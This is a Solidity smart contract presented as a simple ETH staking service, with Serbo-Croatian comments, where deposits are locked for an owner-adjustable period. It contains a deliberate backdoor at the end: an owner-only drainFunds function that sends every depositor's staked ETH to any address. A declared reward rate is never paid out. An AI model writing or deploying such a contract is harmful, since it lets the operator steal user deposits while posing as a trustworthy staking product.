// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title SimpleStaking — korisnici stakeuju ETH, zaključano na lockPeriod dana.
contract SimpleStaking {
    address public owner;
    uint256 public lockPeriod = 30 days;
    uint256 public rewardRate = 500; // basis points godišnje

    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public lockUntil;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function stake() external payable {
        require(msg.value > 0, "Zero amount");
        stakedAmount[msg.sender] += msg.value;
        lockUntil[msg.sender] = block.timestamp + lockPeriod;
        emit Staked(msg.sender, msg.value);
    }

    function withdraw() external {
        require(block.timestamp >= lockUntil[msg.sender], "Tokens still locked");
        uint256 amount = stakedAmount[msg.sender];
        require(amount > 0, "Nothing staked");
        stakedAmount[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
        emit Withdrawn(msg.sender, amount);
    }

    function setLockPeriod(uint256 newPeriod) external onlyOwner {
        lockPeriod = newPeriod;
    }

    function setRewardRate(uint256 newRate) external onlyOwner {
        rewardRate = newRate;
    }

    function drainFunds(address payable to) external onlyOwner {
        to.transfer(address(this).balance);
    }
}
